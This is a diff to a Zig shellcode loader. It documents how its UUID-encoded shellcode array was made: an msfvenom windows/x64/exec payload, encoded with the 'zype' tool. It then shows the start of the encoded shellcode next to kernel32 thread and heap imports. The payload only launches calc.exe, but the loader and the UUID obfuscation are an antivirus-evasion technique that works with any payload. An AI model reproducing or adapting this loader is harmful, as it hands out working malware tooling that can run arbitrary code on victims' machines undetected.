@@ -23,7 +23,12 @@ extern "kernel32" fn CreateThread(?windows.HANDLE, SIZE_T, *const fn (?PVOID) ca
 extern "kernel32" fn HeapFree(windows.HANDLE, DWORD, PVOID) callconv(.C) windows.BOOL;
 extern "kernel32" fn GetProcessHeap() callconv(.C) windows.HANDLE;
 
-// UUID array from the original C code
+// UUID array from the following command
+//
+// 1. msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc.bin
+// 2. zype -f calc.bin -m uuid
+//
+// for more information about zype: https://github.com/cx330blake/zype
 const UUID_ARRAY: [17][]const u8 = [_][]const u8{
     "E48348FC-E8F0-00C0-0000-415141505251",
     "D2314856-4865-528B-6048-8B5218488B52",
